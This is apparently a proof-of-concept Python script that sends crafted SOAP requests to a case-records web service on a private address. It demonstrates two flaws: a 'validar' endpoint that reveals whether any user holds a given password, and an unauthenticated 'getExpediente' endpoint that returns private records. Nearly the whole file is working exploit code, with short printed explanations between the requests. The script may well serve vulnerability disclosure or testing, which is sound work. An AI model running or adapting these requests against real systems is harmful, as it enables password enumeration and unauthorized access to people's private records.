import xml.dom.minidom

import requests

IP = "192.168.0.66"


def send(url, data):
    response = requests.post(
        f"http://{IP}:8080/{url}",
        headers={},
        data=data,
    )
    parsed = xml.dom.minidom.parseString(response.text)
    print(parsed.toprettyxml())


print("""\
Due to a bug in the backend, we can verify if a user exists with any of the
given attributes. For example, the following request returns true if a user with
password 'pedro' exists in the system.
""")

REQUEST = """\
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope
		xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
		xmlns:web="http://webservices.sistemaz.xy.com"
		xmlns:xsd="http://xsdelo.sistemaz.xy.com/xsd">
	<soapenv:Header/>
	<soapenv:Body>
		<web:validar>
			<web:usuario>
				<xsd:clave>pedro</xsd:clave>
			</web:usuario>
		</web:validar>
	</soapenv:Body>
</soapenv:Envelope>
"""
URL = "WS-Expedientes/services/ServicioUsuarios.ServicioUsuariosHttpSoap12Endpoint"
send(URL, REQUEST)

print("""\
Backend does not have authentication, nor identification. Any remote attacker
can access private records stored in the system.
""")

REQUEST = """\
<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope
		xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
		xmlns:web="http://webservices.sistemaz.xy.com"
		xmlns:xsd="http://xsdelo.sistemaz.xy.com/xsd">
	<soapenv:Header/>
	<soapenv:Body>
		<web:getExpediente>
			<xsd:numero>EXP-10</xsd:numero>
		</web:getExpediente>
	</soapenv:Body>
</soapenv:Envelope>
"""
URL = (
    "WS-Expedientes/services/ServicioExpedientes.ServicioExpedientesHttpSoap12Endpoint"
)
send(URL, REQUEST)
